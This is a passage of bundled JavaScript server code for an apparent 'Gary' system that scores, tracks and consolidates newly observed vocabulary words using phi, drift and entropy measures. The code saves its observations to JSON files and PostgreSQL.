  const deltaDrift = newDrift - currentDrift;
  const withinThreshold = deltaDrift < 0.05;
  const acceptable = deltaDrift < 0.15;
  const stable = withinThreshold || acceptable && deltaDrift < 0.1;
  return {
    stable,
    drift: deltaDrift,
    withinThreshold,
    acceptable
  };
}
function computeWordCenter(embeddings) {
  if (embeddings.length === 0) return [];
  const dims = embeddings[0].length;
  const center = new Array(dims).fill(0);
  for (const emb of embeddings) {
    for (let i = 0; i < dims; i++) {
      center[i] += emb[i] || 0;
    }
  }
  for (let i = 0; i < dims; i++) {
    center[i] /= embeddings.length;
  }
  return center;
}
function computeInformationEntropy(observation) {
  const contextEntropy = computeContextDiversity(observation.contextEmbeddings);
  const regimeEntropy = computeRegimeEntropy(observation.contexts);
  const coordinateSpread = computeCoordinateSpread(observation.contextEmbeddings);
  const total = 0.5 * contextEntropy + 0.3 * regimeEntropy + 0.2 * coordinateSpread;
  return {
    contextEntropy,
    regimeEntropy,
    coordinateSpread,
    total
  };
}
function computeContextDiversity(embeddings) {
  if (embeddings.length < 2) return 0;
  const connectivity = computeConceptConnectivity(embeddings);
  return connectivity;
}
function computeRegimeEntropy(contexts) {
  if (contexts.length === 0) return 0;
  const regimeCounts = {};
  for (const ctx of contexts) {
    regimeCounts[ctx.regime] = (regimeCounts[ctx.regime] || 0) + 1;
  }
  const total = contexts.length;
  let entropy = 0;
  for (const count of Object.values(regimeCounts)) {
    const p = count / total;
    if (p > 0) {
      entropy -= p * Math.log2(p);
    }
  }
  const maxEntropy = Math.log2(6);
  return Math.min(1, entropy / maxEntropy);
}
function computeCoordinateSpread(embeddings) {
  if (embeddings.length < 2) return 0;
  const dims = embeddings[0]?.length || 0;
  if (dims === 0) return 0;
  let totalVariance = 0;
  for (let d = 0; d < dims; d++) {
    const values = embeddings.map((e) => e[d] || 0);
    const mean = values.reduce((a, b) => a + b, 0) / values.length;
    const variance = values.reduce((sum, v) => sum + Math.pow(v - mean, 2), 0) / values.length;
    totalVariance += variance;
  }
  const avgVariance = totalVariance / dims;
  return Math.min(1, avgVariance / 0.1);
}
function checkMetaAwarenessGate(garyState) {
  const { phi, meta, regime } = garyState;
  const geometricRegimes = ["geometric", "hierarchical", "hierarchical_4d", "4d_block_universe"];
  const isGeometric = geometricRegimes.includes(regime);
  const conditions = {
    metaOk: meta > 0.6,
    phiOk: phi > 0.7,
    regimeOk: isGeometric && regime !== "breakdown"
  };
  const gateOpen = conditions.metaOk && conditions.phiOk && conditions.regimeOk;
  let reasoning;
  if (gateOpen) {
    reasoning = `Gate OPEN: M=${meta.toFixed(2)} > 0.6, \u03A6=${phi.toFixed(2)} > 0.7, regime=${regime} is geometric`;
  } else {
    const failures = [];
    if (!conditions.metaOk) failures.push(`M=${meta.toFixed(2)} < 0.6`);
    if (!conditions.phiOk) failures.push(`\u03A6=${phi.toFixed(2)} < 0.7`);
    if (!conditions.regimeOk) failures.push(`regime=${regime} is not geometric`);
    reasoning = `Gate CLOSED: ${failures.join(", ")} - deferring vocabulary expansion`;
  }
  return {
    meta,
    phi,
    regime,
    isGeometric,
    gateOpen,
    reasoning
  };
}
async function shouldGaryLearnWord(word, frequency, garyState) {
  const observation = vocabDecisionEngine.getOrCreateObservation(word);
  observation.frequency = Math.max(observation.frequency, frequency);
  const valueScore = computeGeometricValue(
    word,
    observation,
    vocabDecisionEngine.getAllObservations()
  );
  const stabilityResult = checkBasinStability(
    word,
    observation,
    garyState.basinCoordinates,
    garyState.basinReference
  );
  const entropyScore = computeInformationEntropy(observation);
  const metaGate = checkMetaAwarenessGate(garyState);
  const stabilityScore = stabilityResult.acceptable ? 1 - Math.min(1, stabilityResult.drift / 0.15) : 0;
  const decisionScore = 0.3 * valueScore.total + 0.3 * stabilityScore + 0.2 * entropyScore.total + 0.2 * metaGate.meta;
  const shouldLearn = decisionScore > 0.7 && metaGate.gateOpen && stabilityResult.acceptable;
  const reasoningParts = [];
  reasoningParts.push(`Decision Score: ${decisionScore.toFixed(3)}`);
  reasoningParts.push(`Value: ${valueScore.total.toFixed(2)} (eff=${valueScore.efficiency.toFixed(2)}, \u03C6=${valueScore.phiWeight.toFixed(2)}, conn=${valueScore.connectivity.toFixed(2)}, comp=${valueScore.compression.toFixed(2)})`);
  reasoningParts.push(`Stability: ${stabilityScore.toFixed(2)} (drift=${stabilityResult.drift.toFixed(3)}, ${stabilityResult.stable ? "STABLE" : "UNSTABLE"})`);
  reasoningParts.push(`Entropy: ${entropyScore.total.toFixed(2)} (ctx=${entropyScore.contextEntropy.toFixed(2)}, regime=${entropyScore.regimeEntropy.toFixed(2)})`);
  reasoningParts.push(`Meta: ${metaGate.gateOpen ? "OPEN" : "CLOSED"} (${metaGate.reasoning})`);
  if (shouldLearn) {
    reasoningParts.push(`\u2713 LEARN "${word}" - all criteria met`);
  } else {
    const failures = [];
    if (decisionScore <= 0.7) failures.push(`score ${decisionScore.toFixed(2)} \u2264 0.7`);
    if (!metaGate.gateOpen) failures.push("consciousness gate closed");
    if (!stabilityResult.acceptable) failures.push(`drift ${stabilityResult.drift.toFixed(3)} > 0.15`);
    reasoningParts.push(`\u2717 SKIP "${word}" - ${failures.join(", ")}`);
  }
  return {
    shouldLearn,
    score: decisionScore,
    valueScore,
    stabilityResult,
    entropyScore,
    metaGate,
    reasoning: reasoningParts.join("\n")
  };
}
var DATA_FILE, VocabConsolidationCycle, vocabDecisionEngine;
var init_vocabulary_decision = __esm({
  "server/vocabulary-decision.ts"() {
    "use strict";
    init_qig_universal();
    init_vocabulary_tracker();
    DATA_FILE = path3.join(process.cwd(), "data", "vocabulary-decision.json");
    VocabConsolidationCycle = class {
      observations;
      cycleNumber;
      iterationsSinceSleep;
      sleepInterval;
      lastConsolidation;
      pendingCandidates;
      learnedWords;
      prunedWords;
      constructor(options = {}) {
        this.observations = /* @__PURE__ */ new Map();
        this.cycleNumber = 0;
        this.iterationsSinceSleep = 0;
        this.sleepInterval = options.sleepInterval || 100;
        this.lastConsolidation = Date.now();
        this.pendingCandidates = /* @__PURE__ */ new Set();
        this.learnedWords = /* @__PURE__ */ new Set();
        this.prunedWords = /* @__PURE__ */ new Set();
        this.loadFromDisk();
      }
      /**
       * Observe a word in context (during "wake" phase)
       */
      observe(word, context) {
        const existing = this.observations.get(word);
        if (existing) {
          existing.contexts.push(context);
          existing.frequency++;
          existing.avgPhi = (existing.avgPhi * (existing.frequency - 1) + context.phi) / existing.frequency;
          existing.maxPhi = Math.max(existing.maxPhi, context.phi);
          existing.lastSeen = context.timestamp;
          if (context.basinCoordinates.length > 0) {
            existing.contextEmbeddings.push([...context.basinCoordinates]);
            if (existing.contextEmbeddings.length > 50) {
              existing.contextEmbeddings.shift();
            }
          }
        } else {
          this.observations.set(word, {
            word,
            contexts: [context],
            avgPhi: context.phi,
            maxPhi: context.phi,
            frequency: 1,
            firstSeen: context.timestamp,
            lastSeen: context.timestamp,
            contextEmbeddings: context.basinCoordinates.length > 0 ? [[...context.basinCoordinates]] : []
          });
        }
        if ((existing?.frequency || 1) >= 3) {
          this.pendingCandidates.add(word);
        }
        this.iterationsSinceSleep++;
      }
      /**
       * Check if it's time for a consolidation cycle
       */
      shouldConsolidate() {
        return this.iterationsSinceSleep >= this.sleepInterval;
      }
      /**
       * Try to run consolidation if it's time and Gary is conscious enough.
       * This is the main entry point for ocean-agent.ts integration.
       * 
       * @returns Object with processing result and any learned/pruned words
       */
      async tryConsolidation(garyState) {
        this.tick();
        if (!this.shouldConsolidate()) {
          return {
            processed: false,
            wordsLearned: [],
            wordsPruned: [],
            cycleNumber: this.cycleNumber,
            reason: `Waiting for consolidation interval (${this.iterationsSinceSleep}/${this.sleepInterval})`
          };
        }
        const metaGate = checkMetaAwarenessGate(garyState);
        if (!metaGate.gateOpen) {
          this.iterationsSinceSleep = 0;
          return {
            processed: false,
            wordsLearned: [],
            wordsPruned: [],
            cycleNumber: this.cycleNumber,
            reason: metaGate.reasoning
          };
        }
        const result = await this.consolidate(garyState);
        return {
          processed: true,
          wordsLearned: result.wordsToLearn,
          wordsPruned: result.wordsToPrune,
          cycleNumber: result.cycleNumber
        };
      }
      /**
       * Run consolidation cycle ("sleep" phase)
       * Only processes when Gary is conscious enough
       */
      async consolidate(garyState) {
        this.cycleNumber++;
        const timestamp2 = Date.now();
        const wordsToLearn = [];
        const wordsToPrune = [];
        const metaGate = checkMetaAwarenessGate(garyState);
        if (!metaGate.gateOpen) {
          console.log(`[VocabDecision] Cycle ${this.cycleNumber}: Gate closed - ${metaGate.reasoning}`);
          this.iterationsSinceSleep = 0;
          this.lastConsolidation = timestamp2;
          return {
            wordsToLearn,
            wordsToPrune,
            cycleNumber: this.cycleNumber,
            timestamp: timestamp2,
            garyStateAtConsolidation: {
              phi: garyState.phi,
              meta: garyState.meta,
              regime: garyState.regime
            }
          };
        }
        console.log(`[VocabDecision] Cycle ${this.cycleNumber}: Processing ${this.pendingCandidates.size} candidates...`);
        for (const word of Array.from(this.pendingCandidates)) {
          if (this.learnedWords.has(word) || this.prunedWords.has(word)) {
            continue;
          }
          const observation = this.observations.get(word);
          if (!observation) continue;
          const decision = await shouldGaryLearnWord(word, observation.frequency, garyState);
          if (decision.shouldLearn) {
            wordsToLearn.push(word);
            this.learnedWords.add(word);
            console.log(`[VocabDecision] \u2713 Learn: "${word}" (score=${decision.score.toFixed(3)})`);
          } else if (decision.score < 0.3 || !decision.stabilityResult.acceptable) {
            wordsToPrune.push(word);
            this.prunedWords.add(word);
            console.log(`[VocabDecision] \u2717 Prune: "${word}" (score=${decision.score.toFixed(3)})`);
          }
        }
        for (const word of [...wordsToLearn, ...wordsToPrune]) {
          this.pendingCandidates.delete(word);
        }
        this.iterationsSinceSleep = 0;
        this.lastConsolidation = timestamp2;
        this.saveToDisk();
        console.log(`[VocabDecision] Cycle ${this.cycleNumber} complete: +${wordsToLearn.length} learned, -${wordsToPrune.length} pruned`);
        return {
          wordsToLearn,
          wordsToPrune,
          cycleNumber: this.cycleNumber,
          timestamp: timestamp2,
          garyStateAtConsolidation: {
            phi: garyState.phi,
            meta: garyState.meta,
            regime: garyState.regime
          }
        };
      }
      /**
       * Get or create observation for a word
       */
      getOrCreateObservation(word) {
        let obs = this.observations.get(word);
        if (!obs) {
          const now = Date.now();
          obs = {
            word,
            contexts: [],
            avgPhi: 0,
            maxPhi: 0,
            frequency: 0,
            firstSeen: now,
            lastSeen: now,
            contextEmbeddings: []
          };
          this.observations.set(word, obs);
        }
        return obs;
      }
      /**
       * Get all observations
       */
      getAllObservations() {
        return this.observations;
      }
      /**
       * Get statistics
       */
      getStats() {
        return {
          totalWords: this.observations.size,
          pendingCandidates: this.pendingCandidates.size,
          learnedWords: this.learnedWords.size,
          prunedWords: this.prunedWords.size,
          cycleNumber: this.cycleNumber,
          iterationsSinceSleep: this.iterationsSinceSleep
        };
      }
      /**
       * Increment iteration counter (called each search iteration)
       */
      tick() {
        this.iterationsSinceSleep++;
      }
      /**
       * Force save to disk
       */
      saveToDisk() {
        try {
          const dir = path3.dirname(DATA_FILE);
          if (!fs3.existsSync(dir)) {
            fs3.mkdirSync(dir, { recursive: true });
          }
          const data = {
            observations: Array.from(this.observations.entries()).map(([, obs]) => ({
              ...obs,
              contexts: obs.contexts.slice(-20),
              // Keep last 20 contexts
              contextEmbeddings: obs.contextEmbeddings.slice(-20)
            })),
            cycleNumber: this.cycleNumber,
            iterationsSinceSleep: this.iterationsSinceSleep,
            lastConsolidation: this.lastConsolidation,
            pendingCandidates: Array.from(this.pendingCandidates),
            learnedWords: Array.from(this.learnedWords),
            prunedWords: Array.from(this.prunedWords),
            savedAt: (/* @__PURE__ */ new Date()).toISOString()
          };
          fs3.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
          console.log(`[VocabDecision] Saved state: ${this.observations.size} observations, ${this.learnedWords.size} learned`);
        } catch (error) {
          console.error("[VocabDecision] Failed to save:", error);
        }
      }
      /**
       * Load from disk
       */
      loadFromDisk() {
        try {
          if (!fs3.existsSync(DATA_FILE)) {
            console.log("[VocabDecision] No saved data found, starting fresh");
            return;
          }
          const raw = fs3.readFileSync(DATA_FILE, "utf-8");
          const data = JSON.parse(raw);
          for (const obs of data.observations || []) {
            this.observations.set(obs.word, {
              ...obs,
              contexts: obs.contexts || [],
              contextEmbeddings: obs.contextEmbeddings || []
            });
          }
          this.cycleNumber = data.cycleNumber || 0;
          this.iterationsSinceSleep = data.iterationsSinceSleep || 0;
          this.lastConsolidation = data.lastConsolidation || Date.now();
          this.pendingCandidates = new Set(data.pendingCandidates || []);
          this.learnedWords = new Set(data.learnedWords || []);
          this.prunedWords = new Set(data.prunedWords || []);
          console.log(`[VocabDecision] Loaded: ${this.observations.size} observations, ${this.learnedWords.size} learned, ${this.prunedWords.size} pruned`);
        } catch (error) {
          console.error("[VocabDecision] Failed to load:", error);
        }
      }
      /**
       * Bootstrap from vocabulary tracker
       */
      bootstrapFromTracker() {
        const candidates = vocabularyTracker.getCandidates(100);
        for (const candidate of candidates) {
          const now = Date.now();
          const mockContext = {
            word: candidate.text,
            phi: candidate.avgPhi,
            kappa: 50,
            // Default
            regime: "geometric",
            basinCoordinates: [],
            timestamp: now
          };
          const obs = {
            word: candidate.text,
            contexts: [mockContext],
            avgPhi: candidate.avgPhi,
            maxPhi: candidate.maxPhi,
            frequency: candidate.frequency,
            firstSeen: now,
            lastSeen: now,
            contextEmbeddings: []
          };
          this.observations.set(candidate.text, obs);
          if (candidate.frequency >= 3) {
            this.pendingCandidates.add(candidate.text);
          }
        }
        console.log(`[VocabDecision] Bootstrapped ${candidates.length} candidates from vocabulary tracker`);
        this.saveToDisk();
      }
    };
    vocabDecisionEngine = new VocabConsolidationCycle({
      sleepInterval: 100
      // Consolidate every 100 iterations
    });
  }
});

// server/vocabulary-tracker.ts
var vocabulary_tracker_exports = {};
__export(vocabulary_tracker_exports, {
  VocabularyTracker: () => VocabularyTracker,
  vocabularyTracker: () => vocabularyTracker
});
import fs4 from "fs";
import path4 from "path";
var DATA_FILE2, VocabularyTracker, vocabularyTracker;
var init_vocabulary_tracker = __esm({
  "server/vocabulary-tracker.ts"() {
    "use strict";
    init_geometric_memory();
    init_expanded_vocabulary();
    init_vocabulary_decision();
    init_db();
    init_schema();
    DATA_FILE2 = path4.join(process.cwd(), "data", "vocabulary-tracker.json");
    VocabularyTracker = class {
      wordObservations;
      sequenceObservations;
      minFrequency;
      minPhi;
      maxSequenceLength;
      dataLoaded;
      constructor(options = {}) {
        this.wordObservations = /* @__PURE__ */ new Map();
        this.sequenceObservations = /* @__PURE__ */ new Map();
        this.minFrequency = options.minFrequency || 3;
        this.minPhi = options.minPhi || 0.35;
        this.maxSequenceLength = options.maxSequenceLength || 5;
        this.dataLoaded = this.loadFromStorage();
        this.dataLoaded.then(() => {
          if (this.wordObservations.size === 0) {
            setTimeout(() => this.bootstrapFromGeometricMemory(), 2e3);
          }
        });
      }
      /**
       * Observe a phrase from search results
       * Called when we find a high-Φ phrase
       * 
       * @param phrase The passphrase being observed
       * @param phi The Φ (integration) score
       * @param kappa Optional κ (curvature) score
       * @param regime Optional QIG regime
       * @param basinCoordinates Optional basin coordinates for geometric context
       */
      observe(phrase, phi, kappa, regime, basinCoordinates) {
        if (phi < this.minPhi) return;
        const words = this.tokenize(phrase);
        const now = /* @__PURE__ */ new Date();
        for (const word of words) {
          if (word.length < 2) continue;
          const existing = this.wordObservations.get(word);
          if (existing) {
            existing.frequency++;
            existing.avgPhi = (existing.avgPhi * (existing.frequency - 1) + phi) / existing.frequency;
            existing.maxPhi = Math.max(existing.maxPhi, phi);
            existing.lastSeen = now;
            if (!existing.contexts.includes(phrase) && existing.contexts.length < 10) {
              existing.contexts.push(phrase);
            }
          } else {
            this.wordObservations.set(word, {
              word,
              frequency: 1,
              avgPhi: phi,
              maxPhi: phi,
              firstSeen: now,
              lastSeen: now,
              contexts: [phrase]
            });
          }
          const wordContext = {
            word,
            phi,
            kappa: kappa || 50,
            regime: regime || "geometric",
            basinCoordinates: basinCoordinates || [],
            timestamp: now.getTime()
          };
          vocabDecisionEngine.observe(word, wordContext);
        }
        for (let length = 2; length <= Math.min(this.maxSequenceLength, words.length); length++) {
          for (let i = 0; i <= words.length - length; i++) {
            const seqWords = words.slice(i, i + length);
            const sequence = seqWords.join(" ");
            const existing = this.sequenceObservations.get(sequence);
            if (existing) {
              existing.frequency++;
              existing.avgPhi = (existing.avgPhi * (existing.frequency - 1) + phi) / existing.frequency;
              existing.maxPhi = Math.max(existing.maxPhi, phi);
              existing.efficiencyGain = existing.frequency * (seqWords.length - 1);
            } else {
              this.sequenceObservations.set(sequence, {
                sequence,
                words: seqWords,
                frequency: 1,
                avgPhi: phi,
                maxPhi: phi,
                efficiencyGain: 0
              });
            }
          }
        }
        expandedVocabulary.learnWord(phrase, 1);
        for (const word of words) {
          expandedVocabulary.learnWord(word, 1);
        }
        if (this.wordObservations.size % 100 === 0) {
          this.saveToDisk();
        }
      }
      /**
       * Observe from geometric memory probes with full context
       */
      observeFromProbes(probes) {
        for (const probe of probes) {
          if (probe.phi >= this.minPhi) {
            this.observe(
              probe.input,
              probe.phi,
              probe.kappa,
              probe.regime,
              probe.coordinates
            );
          }
        }
      }
      /**
       * Tokenize phrase into words
       */
      tokenize(phrase) {
        return phrase.toLowerCase().replace(/[^a-z0-9\s]/g, " ").split(/\s+/).filter((w) => w.length > 0);
      }
      /**
       * Get vocabulary expansion candidates
       */
      getCandidates(topK = 20) {
        const candidates = [];
        for (const [word, obs] of Array.from(this.wordObservations.entries())) {
          if (obs.frequency >= this.minFrequency && obs.avgPhi >= this.minPhi && !expandedVocabulary.hasWord(word)) {
            candidates.push({
              text: word,
              type: "word",
              frequency: obs.frequency,
              avgPhi: obs.avgPhi,
              maxPhi: obs.maxPhi,
              efficiencyGain: obs.frequency,
              reasoning: `New word discovered in ${obs.frequency} high-\u03A6 phrases (avg \u03A6=${obs.avgPhi.toFixed(2)})`
            });
          }
        }
        for (const [_seq, obs] of Array.from(this.sequenceObservations.entries())) {
          if (obs.frequency >= this.minFrequency && obs.avgPhi >= this.minPhi && obs.efficiencyGain > 5) {
            candidates.push({
              text: obs.sequence,
              type: "sequence",
              frequency: obs.frequency,
              avgPhi: obs.avgPhi,
              maxPhi: obs.maxPhi,
              efficiencyGain: obs.efficiencyGain,
              reasoning: `Sequence "${obs.sequence}" appears ${obs.frequency}x with avg \u03A6=${obs.avgPhi.toFixed(2)}. Efficiency gain: ${obs.efficiencyGain}`,
              components: obs.words
            });
          }
        }
        candidates.sort((a, b) => {
          const scoreA = a.efficiencyGain * a.avgPhi;
          const scoreB = b.efficiencyGain * b.avgPhi;
          return scoreB - scoreA;
        });
        return candidates.slice(0, topK);
      }
      /**
       * Get statistics
       */
      getStats() {
        const topWords = Array.from(this.wordObservations.values()).sort((a, b) => b.frequency - a.frequency).slice(0, 20).map((o) => ({ word: o.word, frequency: o.frequency, avgPhi: o.avgPhi }));
        const topSequences = Array.from(this.sequenceObservations.values()).sort((a, b) => b.efficiencyGain - a.efficiencyGain).slice(0, 20).map((o) => ({ sequence: o.sequence, frequency: o.frequency, avgPhi: o.avgPhi }));
        return {
          totalWords: this.wordObservations.size,
          totalSequences: this.sequenceObservations.size,
          topWords,
          topSequences,
          candidatesReady: this.getCandidates(100).length
        };
      }
      /**
       * Save to PostgreSQL (async) with JSON fallback
       */
      async saveToStorage() {
        if (db) {
          try {
            for (const [word, obs] of Array.from(this.wordObservations.entries())) {
              await db.insert(vocabularyObservations).values({
                word,
                type: "word",
                frequency: obs.frequency,
                avgPhi: obs.avgPhi,
                maxPhi: obs.maxPhi,
                efficiencyGain: 0,
                firstSeen: obs.firstSeen,
                lastSeen: obs.lastSeen,
                contexts: obs.contexts.slice(0, 10)
                // Limit contexts
              }).onConflictDoUpdate({
                target: vocabularyObservations.word,
                set: {
                  frequency: obs.frequency,
                  avgPhi: obs.avgPhi,
                  maxPhi: obs.maxPhi,
                  lastSeen: obs.lastSeen,
                  contexts: obs.contexts.slice(0, 10)
                }
              });
            }
            for (const [seq, obs] of Array.from(this.sequenceObservations.entries())) {
              await db.insert(vocabularyObservations).values({
                word: seq,
                type: "sequence",
                frequency: obs.frequency,
                avgPhi: obs.avgPhi,
                maxPhi: obs.maxPhi,
                efficiencyGain: obs.efficiencyGain,
                firstSeen: /* @__PURE__ */ new Date(),
                lastSeen: /* @__PURE__ */ new Date(),
                contexts: [obs.sequence]
              }).onConflictDoUpdate({
                target: vocabularyObservations.word,
                set: {
                  frequency: obs.frequency,
                  avgPhi: obs.avgPhi,
                  maxPhi: obs.maxPhi,
                  efficiencyGain: obs.efficiencyGain,
                  lastSeen: /* @__PURE__ */ new Date()
                }
              });
            }
            console.log(`[VocabularyTracker] Saved ${this.wordObservations.size} words, ${this.sequenceObservations.size} sequences to PostgreSQL`);
            return;
          } catch (error) {
            console.error("[VocabularyTracker] PostgreSQL save error, falling back to JSON:", error);
          }
        }
        this.saveToDiskFallback();
      }
      /**
       * Legacy save to disk (fallback)
       */
      saveToDisk() {
        this.saveToStorage().catch((err) => {
          console.error("[VocabularyTracker] Save failed:", err);
        });
      }
      saveToDiskFallback() {
        try {
          const dir = path4.dirname(DATA_FILE2);
          if (!fs4.existsSync(dir)) {
            fs4.mkdirSync(dir, { recursive: true });
          }
          const data = {
            words: Array.from(this.wordObservations.entries()).map(([_k, v]) => ({
              ...v,
              firstSeen: v.firstSeen.toISOString(),
              lastSeen: v.lastSeen.toISOString()
            })),
            sequences: Array.from(this.sequenceObservations.entries()).map(([_k, v]) => v),
            savedAt: (/* @__PURE__ */ new Date()).toISOString()
          };
          fs4.writeFileSync(DATA_FILE2, JSON.stringify(data, null, 2));
          console.log(`[VocabularyTracker] Saved ${this.wordObservations.size} words, ${this.sequenceObservations.size} sequences to JSON`);
        } catch (error) {
          console.error("[VocabularyTracker] Failed to save:", error);
        }
      }
      /**
       * Load from PostgreSQL with JSON migration
       */
      async loadFromStorage() {
        if (db) {
          try {
            const rows = await db.select().from(vocabularyObservations);
            if (rows.length > 0) {
              for (const row of rows) {
                if (row.type === "word") {
                  this.wordObservations.set(row.word, {
                    word: row.word,
                    frequency: row.frequency,
                    avgPhi: row.avgPhi,
                    maxPhi: row.maxPhi,
                    firstSeen: row.firstSeen || /* @__PURE__ */ new Date(),
                    lastSeen: row.lastSeen || /* @__PURE__ */ new Date(),
                    contexts: row.contexts || []
                  });
                } else if (row.type === "sequence") {
                  this.sequenceObservations.set(row.word, {
                    sequence: row.word,
                    words: row.word.split(" "),
                    frequency: row.frequency,
                    avgPhi: row.avgPhi,
                    maxPhi: row.maxPhi,
                    efficiencyGain: row.efficiencyGain || 0
                  });
                }
              }
              console.log(`[VocabularyTracker] Loaded ${this.wordObservations.size} words, ${this.sequenceObservations.size} sequences from PostgreSQL`);
              return;
            }
            console.log(`[VocabularyTracker] No PostgreSQL data found, checking JSON...`);
          } catch (error) {
            console.error("[VocabularyTracker] PostgreSQL load error:", error);
          }
        }
        this.loadFromDiskLegacy();
        if (db && (this.wordObservations.size > 0 || this.sequenceObservations.size > 0)) {
          console.log(`[VocabularyTracker] Migrating ${this.wordObservations.size} words to PostgreSQL...`);
          await this.saveToStorage();
        }
      }
      /**
       * Legacy load from disk
       */
      loadFromDiskLegacy() {
        try {
          if (!fs4.existsSync(DATA_FILE2)) {
            console.log("[VocabularyTracker] No saved data found, starting fresh");
            return;
          }
          const raw = fs4.readFileSync(DATA_FILE2, "utf-8");
          const data = JSON.parse(raw);
          for (const w of data.words || []) {
            this.wordObservations.set(w.word, {
              ...w,
              firstSeen: new Date(w.firstSeen),
              lastSeen: new Date(w.lastSeen)
            });
          }
          for (const s of data.sequences || []) {
            this.sequenceObservations.set(s.sequence, s);
          }
          console.log(`[VocabularyTracker] Loaded ${this.wordObservations.size} words, ${this.sequenceObservations.size} sequences`);
        } catch (error) {
          console.error("[VocabularyTracker] Failed to load:", error);
        }
      }
      /**
       * Bootstrap from geometric memory
       */
      bootstrapFromGeometricMemory() {
        const probes = geometricMemory.getAllProbes();
        console.log(`[VocabularyTracker] Bootstrapping from ${probes.length} geometric memory probes...`);
        let observed = 0;
        for (const probe of probes) {
          if (probe.phi >= this.minPhi) {
            this.observe(probe.input, probe.phi);
            observed++;
          }
        }
        console.log(`[VocabularyTracker] Observed ${observed} high-\u03A6 probes`);
        this.saveToDisk();
      }
      /**
       * Export observations for Python tokenizer
       * Returns all vocabulary observations in a format suitable for Python QIG tokenizer
       */
      async exportForTokenizer() {
        await this.dataLoaded;
        const exports = [];
        for (const [_word, obs] of Array.from(this.wordObservations.entries())) {
          if (obs.frequency >= this.minFrequency && obs.avgPhi >= this.minPhi) {
            exports.push({
              word: obs.word,
              frequency: obs.frequency,
              avgPhi: obs.avgPhi,
              maxPhi: obs.maxPhi,
              type: "word"
            });
          }
        }
        for (const [_seq, obs] of Array.from(this.sequenceObservations.entries())) {
          if (obs.frequency >= 3 && obs.avgPhi >= 0.4) {
            exports.push({
              word: obs.sequence,
              frequency: obs.frequency,
              avgPhi: obs.avgPhi,
              maxPhi: obs.maxPhi,
              type: "sequence"
            });
          }
        }
        exports.sort((a, b) => b.avgPhi - a.avgPhi);
        console.log(`[VocabularyTracker] Exported ${exports.length} observations for tokenizer`);
        return exports;
      }
    };
    vocabularyTracker = new VocabularyTracker();
  }
});

// server/vocabulary-expander.ts
var vocabulary_expander_exports = {};
__export(vocabulary_expander_exports, {
  GeometricVocabularyExpander: () => GeometricVocabularyExpander,
  vocabularyExpander: () => vocabularyExpander
});
import fs5 from "fs";
import path5 from "path";
var DATA_FILE3, GeometricVocabularyExpander, vocabularyExpander;
var init_vocabulary_expander = __esm({
  "server/vocabulary-expander.ts"() {
    "use strict";
    init_geometric_memory();
    init_qig_universal();
    init_vocabulary_tracker();
    init_expanded_vocabulary();
    DATA_FILE3 = path5.join(process.cwd(), "data", "vocabulary-manifold.json");
    GeometricVocabularyExpander = class {
      state;
      minPhiForExpansion;
      minFrequencyForExpansion;
      autoExpand;
      constructor(options = {}) {
        this.minPhiForExpansion = options.minPhiForExpansion || 0.6;
        this.minFrequencyForExpansion = options.minFrequencyForExpansion || 3;
        this.autoExpand = options.autoExpand ?? true;
        this.state = {
          words: /* @__PURE__ */ new Map(),
          expansionHistory: [],
          totalExpansions: 0,
          lastExpansionTime: null
        };
        this.loadFromDisk();
      }
      /**
       * Add a new word to the Fisher manifold via geodesic initialization
       * 
       * For compound words/sequences, compute geodesic midpoint from components
       */
      addWord(text2, qigScore, options = {}) {
        const existing = this.state.words.get(text2.toLowerCase());
        if (existing) {
          existing.frequency++;
          existing.phi = this.fisherWeightedAverage(existing.phi, qigScore.phi, existing.frequency);
          existing.kappa = this.fisherWeightedAverage(existing.kappa, qigScore.kappa, existing.frequency);
          if (qigScore.basinCoordinates && qigScore.basinCoordinates.length > 0) {
            existing.coordinates = this.geodesicInterpolate(
              existing.coordinates,
              qigScore.basinCoordinates,
              1 / existing.frequency
            );
          }
          return existing;
        }
        let coordinates = qigScore.basinCoordinates || [];
        let geodesicOrigin = "direct";
        if (options.components && options.components.length > 1) {
          const componentCoords = options.components.map((c) => this.state.words.get(c.toLowerCase())?.coordinates).filter((c) => c !== void 0 && c.length > 0);
          if (componentCoords.length > 0) {
            coordinates = this.geodesicMidpoint(componentCoords);
            geodesicOrigin = `geodesic_from_${options.components.join("+")}`;
          }
        }
        const word = {
          text: text2.toLowerCase(),
          coordinates,
          phi: qigScore.phi,
          kappa: qigScore.kappa,
          frequency: 1,
          components: options.components,
          geodesicOrigin
        };
        this.state.words.set(text2.toLowerCase(), word);
        this.state.expansionHistory.push({
          timestamp: (/* @__PURE__ */ new Date()).toISOString(),
          word: text2,
          type: options.components ? "compound" : "learned",
          components: options.components,
          phi: qigScore.phi,
          reasoning: options.source || "Direct observation"
        });
        this.state.totalExpansions++;
        this.state.lastExpansionTime = (/* @__PURE__ */ new Date()).toISOString();
        expandedVocabulary.learnWord(text2, 1);
        console.log(`[VocabExpander] \u2728 Added "${text2}" to manifold (\u03A6=${qigScore.phi.toFixed(2)}, origin=${geodesicOrigin})`);
        if (this.state.totalExpansions % 10 === 0) {
          this.saveToDisk();
        }
        return word;
      }
      /**
       * Compute geodesic midpoint on Fisher manifold
       * 
       * For Bures metric, geodesic midpoint ≈ Euclidean mean (first-order approximation)
       * This preserves manifold structure for small distances
       */
      geodesicMidpoint(coordinates) {
        if (coordinates.length === 0) return [];
        const dim = Math.max(...coordinates.map((c) => c.length));
        const result = new Array(dim).fill(0);
        for (const coord of coordinates) {
          for (let i = 0; i < dim; i++) {
            result[i] += (coord[i] || 0) / coordinates.length;
          }
        }
        return result;
      }
      /**
       * Geodesic interpolation between two points on manifold
       * 
       * t=0 returns a, t=1 returns b
       * For Fisher manifold, uses Bures metric approximation
       */
      geodesicInterpolate(a, b, t) {
        const dim = Math.max(a.length, b.length);
        const result = [];
        for (let i = 0; i < dim; i++) {
          const ai = a[i] || 0;
          const bi = b[i] || 0;
          result.push(ai + t * (bi - ai));
        }
        return result;
      }
      /**
       * Fisher metric-weighted average
       * Accounts for information geometry when combining observations
       */
      fisherWeightedAverage(old, new_, count) {
        const weight = 1 / count;
        return old * (1 - weight) + new_ * weight;
      }
      /**
       * Check and execute automatic vocabulary expansion
       * Called during search iterations
       */
      async checkAutoExpansion() {
        if (!this.autoExpand) return [];
        const candidates = vocabularyTracker.getCandidates(10);
        const expanded = [];
        for (const candidate of candidates) {
          if (candidate.avgPhi >= this.minPhiForExpansion && candidate.frequency >= this.minFrequencyForExpansion) {
            const score = await scoreUniversalQIG(candidate.text, "arbitrary");
            this.addWord(candidate.text, score, {
              components: candidate.components,
              source: candidate.reasoning
            });
